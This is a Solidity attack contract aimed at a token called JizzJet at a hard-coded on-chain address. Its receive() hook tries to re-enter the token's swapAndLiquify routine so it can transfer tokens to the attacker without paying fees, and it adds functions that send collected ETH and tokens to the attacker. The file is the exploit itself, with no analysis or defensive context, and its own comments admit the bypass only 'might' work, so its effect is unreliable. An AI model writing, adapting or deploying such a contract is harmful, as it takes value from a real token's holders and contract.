interface IJizzJet {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function owner() external view returns (address);
    function swapAndLiquifyEnabled() external view returns (bool);
    function _maxTxAmount() external view returns (uint256);
}

contract AttackContract {
    IJizzJet public token;
    address public attacker;
    bool private reentering;

    constructor() {
        token = IJizzJet(0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2);
        attacker = msg.sender;
    }

    // This will be called when the contract receives ETH during swapAndLiquify
    receive() external payable {
        if (!reentering && msg.value > 0) {
            reentering = true;

            // Re-enter the token contract while inSwapAndLiquify is true
            // Try to transfer tokens without paying fees
            // The contract might skip fee calculations during reentrancy

            // Transfer some tokens back to ourselves
            uint256 myBalance = token.balanceOf(address(this));
            if (myBalance > 0) {
                // This transfer might bypass fees due to reentrancy
                token.transfer(attacker, myBalance / 2);
            }

            reentering = false;
        }
    }

    // Fallback for safety
    fallback() external payable {}

    // Allow withdrawing any ETH sent here
    function withdraw() external {
        payable(attacker).transfer(address(this).balance);
    }

    // Allow withdrawing any tokens
    function withdrawTokens() external {
        uint256 balance = token.balanceOf(address(this));
        token.transfer(attacker, balance);
    }
}

